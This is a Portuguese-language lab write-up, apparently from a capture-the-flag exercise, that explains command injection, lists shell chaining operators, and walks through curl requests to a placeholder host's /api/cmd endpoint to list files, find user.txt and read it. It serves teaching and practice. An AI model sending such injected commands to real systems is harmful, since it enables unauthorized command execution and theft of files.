# _**Contexto de Injeção de comadno**_
Dependendo da funcionalidade do aplicativo web, será necessário algum tipo de interação com o sistema host subjacente  
Isso geralmente é feito passando comandos brutos do sistema ou entradas para um shell de comando  

Exemplos de quando aplicativos web interagem com sistemas host incluem:
* Verificar estatísticas de monitoramento, por exemplo, RAM sendo usada, espaço livre em disco
* Processos de conversão de arquivos, por exemplo, o aplicativo da web receberia um arquivo de imagem que deseja converter em um tipo de imagem diferente
* Deixando a funcionalidade de depuração aberta; algumas estruturas têm funcionalidade de depuração opcional que envolve interação com o sistema de arquivos subjacente

Qualquer entrada controlada por um usuário não deve ser considerada confiável pelo servidor  
A entrada do usuário pode ser manipulada  
No caso de uma aplicação web usar comandos do sistema, um usuário pode manipular a entrada para executar comandos arbitrários do sistema  
Esse tipo de ataque é chamado de ataque de injeção de comando  

Ataques de injeção de comando são considerados extremamente perigosos; eles essencialmente permitem que um invasor execute comandos em um sistema  
A ação mais comum ao descobrir que você sofreu um ataque de injeção de comando é obter um shell reverso  
Shells reversos podem ser considerados backdoors  
Quando um invasor cria esse shell reverso, o servidor alvo atua como um cliente, executa o comando enviado por um invasor e, às vezes, envia a saída do comando de volta para o invasor  

***

**Diferentes maneiras de _code injection_**  
O aplicativo pode apenas pedir aos usuários que insiram comandos  
Este é o melhor cenário possível e tende a ser muito raro  
Tudo o que você precisa fazer é digitar um comando e o aplicativo web o executará no sistema subjacente  

**aplicativo filtra os comandos permitidos:**
Isso tende a ser mais comum do que o problema anterior  
Por exemplo, um aplicativo pode aceitar apenas o comando ping  
Você teria que enumerar quais comandos são permitidos e tentar usar o comando permitido para extrair dados  

**O aplicativo recebe como entrada um comando:**
Isso é ainda mais comum  
Um exemplo é quando um aplicativo recebe a entrada do comando ping e a passa para o comando ping no backend  

Se a entrada não for codificada ou filtrada, você pode usá-la para executar outros comandos.
* O operador && é usado com mais de um comando, por exemplo, ls && pwd. O segundo comando só é executado se o primeiro e o segundo forem bem-sucedidos. Você pode passar uma entrada contendo && other-command e o backend a executará com sucesso se ambos os comandos forem executados com sucesso.
* O comando | é usado para passar a saída de um comando para outro e também pode ser usado para executar comandos no servidor.
* O caractere ; também funciona bem. Na maioria dos shells, ele indica que um comando foi concluído. Você pode usá-lo para encadear comandos, como se a entrada fosse comando. Então você pode fornecer comando;outro-comando.

# _**Execução**_
Sabemos que o McSkidy encontrou o seguinte trecho: _/api/cmd_
O endpoint _/api/cmd_ geralmente é usado em APIs como uma interface para executar comandos — o "cmd" vem de "command"  
No entanto, o significado exato desse endpoint pode variar bastante dependendo do sistema ou aplicação em que ele está implementado  

Para testarmos, digitamos o seguinte comando e obtemos a saída abaixo: ```curl http://[ip_address]:3000/api/cmd/ls```

{"stdout":"bin\nboot\ndata\ndev\netc\nhome\nlib\nlib64\nlocal\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n","stderr":""}  

Apesar de aceitar a entrada, ainda não é o que queremos  
Ao usar URLs, lembre-se de codificar em URL os caracteres que não são aceitos  
Sabendo disso, busca-se um codificador de URL online e joga-se o comando ls -la  
```curl http://[ip_address]:3000/api/cmd/ls%20-la%20```

Obtemos uma resposta melhor  
Agora para o que queremos encontrar, user.txt 
Codificamos o comando abaixo  
> ```bash
> find / -type f -name user.txt 2>/dev/null
> ```

Executando o comando, temos o retorno mostrado abaixo  
```curl http://[ip_address]:3000/api/cmd/find%20%2F%20-type%20f%20-name%20user.txt%202%3E%2Fdev%2Fnull```

**/home/bestadmin/user.txt**

Basta codificar o comando abaixo e aplicar com o comando curl e teremos nosso retorno  
```cat /home/bestadmin/user.txt```  
> ```
> http://[ip_address]:3000/api/cmd/cat%20%2Fhome%2Fbestadmin%2Fuser.txt
> ```
